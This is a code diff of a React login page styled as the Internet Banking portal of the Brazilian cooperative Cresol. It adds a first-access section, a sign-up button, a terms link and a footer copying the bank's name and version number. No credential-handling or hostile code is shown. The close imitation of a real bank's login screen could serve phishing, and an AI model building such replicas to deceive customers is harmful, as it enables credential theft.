@@ -1,4 +1,3 @@
-
 import React, { useState } from "react";
 import { Eye, EyeOff, HelpCircle } from "lucide-react";
 import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";
@@ -231,28 +230,44 @@ const Index = () => {
             </button>
           </form>
 
-          {/* Primeiro acesso - só aparece na aba financeiro */}
-          {tab === "financeiro" && (
-            <div className="mt-10 border-t border-gray-100 pt-8">
-              <h2 className="text-lg font-semibold mb-2 text-[#145C36]">Primeiro acesso</h2>
-              <p className="text-sm text-gray-600">
+          {/* Primeiro acesso - abas física, jurídica e financeiro */}
+          {(tab === "fisica" || tab === "juridica" || tab === "financeiro") && (
+            <div className="mt-10 border-t border-gray-100 pt-8 flex flex-col items-center">
+              <h2 className="text-2xl font-bold mb-4 text-[#145C36]">
+                Primeiro acesso
+              </h2>
+              <p className="text-sm text-gray-600 mb-4 text-center">
                 Primeiro acesso ao Internet Banking Cresol? <br />
                 <a href="#" className="text-orange-500 underline hover:text-orange-600 transition">Clique aqui</a> para criar sua senha.
               </p>
-            </div>
-          )}
-
-          {(tab === "fisica" || tab === "juridica") && (
-            <div className="mt-10 border-t border-gray-100 pt-8">
-              <h2 className="text-lg font-semibold mb-2 text-[#145C36]">Primeiro acesso</h2>
-              <p className="text-sm text-gray-600">
-                Primeiro acesso ao Internet Banking Cresol? <br />
-                <a href="#" className="text-orange-500 underline hover:text-orange-600 transition">Clique aqui</a> para criar sua senha.
-              </p>
+              {/* Botão Cadastre-se */}
+              <button
+                type="button"
+                className="w-full max-w-xs h-12 rounded-full border border-orange-500 text-orange-500 font-semibold text-lg transition-colors hover:bg-orange-50 active:bg-orange-100 mb-8"
+                style={{ boxSizing: "border-box" }}
+              >
+                Cadastre-se
+              </button>
+              {/* Linha */}
+              <hr className="w-full border-t border-gray-200 my-2" />
+              {/* Termos de uso */}
+              <div className="w-full mb-7">
+                <p className="text-center text-base text-gray-600">
+                  Consulte aqui nossos{" "}
+                  <a href="#" className="text-orange-500 font-semibold hover:underline transition">
+                    termos de uso
+                  </a>
+                </p>
+              </div>
+              {/* Rodapé Cresol/versionamento */}
+              <div className="mt-2 mb-0 text-center text-xs text-gray-800">
+                <div className="font-semibold">Cresol Internet Banking - 2025</div>
+                <div className="">Versão: 12.4.3.501 (12.4.3-501)</div>
+              </div>
             </div>
           )}
         </div>
-        
+
         {/* Help Icon */}
         <div className="absolute bottom-8 left-8">
           <button className="w-12 h-12 bg-orange-500 rounded-full flex items-center justify-center text-white hover:bg-orange-600 transition-colors shadow-lg">
@@ -260,7 +275,7 @@ const Index = () => {
           </button>
         </div>
       </div>
-      
+
       {/* Right: Imagem da mulher */}
       <div className="w-1/2 hidden lg:block bg-[#f5f6f7] relative overflow-hidden">
         <img
@@ -274,4 +289,3 @@ const Index = () => {
 };
 
 export default Index;
-
